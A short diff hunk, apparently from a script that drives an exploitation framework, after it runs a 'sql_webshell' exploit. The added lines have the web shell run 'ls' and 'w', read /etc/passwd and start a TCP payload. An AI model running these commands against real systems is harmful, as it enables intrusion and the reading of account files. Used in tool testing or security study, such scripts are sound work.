@@ -28,8 +28,12 @@ exploit
 exploit sql_webshell
 
 interact 0
-ls
-w
+
+execute ls
+execute w
+read /etc/passwd
+payload tcp
+
 endInteraction
 
 exit
